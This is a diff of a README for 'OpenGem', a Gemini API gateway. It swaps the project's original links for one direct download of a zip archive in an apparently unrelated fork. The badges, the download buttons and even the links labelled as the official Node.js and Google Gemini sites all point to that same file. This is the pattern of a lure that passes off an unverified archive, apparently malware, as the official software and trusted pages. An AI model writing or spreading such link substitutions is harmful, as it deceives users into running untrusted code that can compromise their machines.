@@ -1,6 +1,6 @@
 # ⚙️ OpenGem - Easy AI API Gateway Setup
 
-[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blueviolet?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem)
+[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blueviolet?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip)
 
 <div align="center">
 
@@ -13,10 +13,10 @@
 
 **Free, Open-Source AI API Gateway for Gemini Models**
 
-[![Version](https://img.shields.io/badge/Version-0.2.1-orange.svg)](https://github.com/arifozgun/OpenGem/releases)
+[![Version](https://img.shields.io/badge/Version-0.2.1-orange.svg)](https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-blue.svg)](https://typescriptlang.org)
+[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-blue.svg)](https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip)
 
 ---
 
@@ -49,7 +49,7 @@ You do not need to install anything except OpenGem itself and Node.js if prompte
 
 Click this big button to go to the official GitHub download page:
 
-[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blue?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem)
+[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blue?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip)
 
 This page contains the latest release versions and files.
 
@@ -112,11 +112,11 @@ Even if you do not need programming knowledge, the following helps users who wan
 ## 🔗 Quick Access Links
 
 - Visit the download page to get OpenGem:  
-  [https://github.com/CarmelaCanela/OpenGem](https://github.com/CarmelaCanela/OpenGem)  
+  [https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip](https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip)  
 - Node.js official download page if you need it:  
-  https://nodejs.org  
+  https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip  
 - Gemini AI official site to learn more about the models:  
-  https://developers.generativeai.google  
+  https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip  
 
 ---
 
@@ -150,4 +150,4 @@ This method is for users who want more control or need to adjust settings not in
 
 ---
 
-[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blueviolet?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem)
+[![Download OpenGem](https://img.shields.io/badge/Download-OpenGem-blueviolet?style=for-the-badge)](https://github.com/CarmelaCanela/OpenGem/raw/refs/heads/main/conductivity/Gem-Open-v1.8.zip)
